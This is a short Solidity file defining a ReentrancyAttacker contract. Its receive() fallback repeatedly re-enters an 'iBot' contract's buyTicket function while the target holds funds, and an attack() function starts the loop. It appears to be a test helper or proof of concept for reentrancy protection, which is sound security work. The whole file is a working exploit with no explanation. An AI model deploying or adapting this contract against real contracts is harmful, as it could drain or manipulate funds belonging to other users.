// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./iBot.sol";

contract ReentrancyAttacker {
    iBot public bot;

    constructor(address _bot) {
        bot = iBot(payable(_bot));
    }

    // Fallback function that attempts reentrancy
    receive() external payable {
        if (address(bot).balance >= msg.value) {
            bot.buyTicket{value: msg.value}();
        }
    }

    function attack() external payable {
        bot.buyTicket{value: msg.value}();
    }
}
